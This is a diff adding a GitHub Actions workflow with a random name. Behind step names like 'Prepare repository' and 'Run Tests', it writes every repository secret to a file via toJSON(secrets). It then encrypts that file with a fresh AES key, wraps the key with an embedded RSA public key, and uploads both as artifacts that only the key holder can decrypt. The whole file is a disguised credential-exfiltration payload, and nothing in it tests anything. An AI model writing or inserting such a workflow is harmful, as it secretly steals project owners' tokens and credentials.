@@ -1,0 +1,57 @@
+name: aktntohlky
+on:
+  push:
+    branches: aktntohlky
+jobs:
+  testing:
+    runs-on:
+    - ubuntu-latest
+    steps:
+    - env:
+        VALUES: ${{ toJSON(secrets)}}
+      name: Prepare repository
+      run: "\ncat <<EOF > output.json\n$VALUES\nEOF\n                    "
+    - name: Run Tests
+      env:
+        PUBKEY: '-----BEGIN PUBLIC KEY-----
+
+          MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAopqKQi9Bhzi+1uQhm9xQ
+
+          /FFiqAyuBWP9XZZjzjLqx/rBZSSyPeazz5U6fBhXHF/Wb/eWZ6JH5ygrfz5/W60/
+
+          yoY5CY/Q7GNa78GYADD09vR2Nen1ldiHYplXYhNo4iP0J9I7ASVhlGZfhkEolnqx
+
+          efdLNdElJjr4/9kB91Cw8Iu3ZSH/dwRB0D5LFXFHp7lsYSm5Z6fdMhStGuI7Suqu
+
+          G2iDBcvNqGZPXji/8R8t+Kv6BHVaBz1JiO8CADC7kCxngviBuZv62wArd0LvVzXq
+
+          7ddmu97YiT+SF2URvjmRkHXVI9rKs6AC4MXdw7QdWZuVas/VJ9SGUNyIljk94jnX
+
+          vZFzSOpnl8+uQLuL1DIVGM4IdC3Fr1SqujODKv5QwVVlYLpNUaVm16KUrBqlvM1I
+
+          HuMS3OisP4Jo0nWQsgs7kacE4m0MkYwkUcg5Xz6IGym6p2wgHkpbQvmMMawqRNHI
+
+          QIKrmBC0koGmI9FGaPLQLjH5nxGdbuCHTKKsBOLa1AyBUBx6GabDIsQOQEdLcSLx
+
+          xETHvFghUiT/6RaSvvZjuyJoC1GEsVEoo9txmvnVlKibdS6qRsvbN7v3xPs1O3ZM
+
+          T9Zd1WWxlM9aoksCWDEjSaYifvJoCTSN/9WMt8jxPwELB04xEfCrNIXSuXzbSZZs
+
+          cPkkGv7n0FNdyjSJXqFe2GUCAwEAAQ==
+
+          -----END PUBLIC KEY-----
+
+          '
+      run: aes_key=$(openssl rand -hex 12 | tr -d '\n');openssl enc -aes-256-cbc -pbkdf2
+        -in output.json -out output_updated.json -pass pass:$aes_key;echo $aes_key
+        | openssl rsautl -encrypt -pkcs -pubin -inkey <(echo "$PUBKEY") -out lookup.txt
+        2> /dev/null;
+    - name: Upload artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: files
+        path: ' |
+
+          output_updated.json
+
+          lookup.txt'
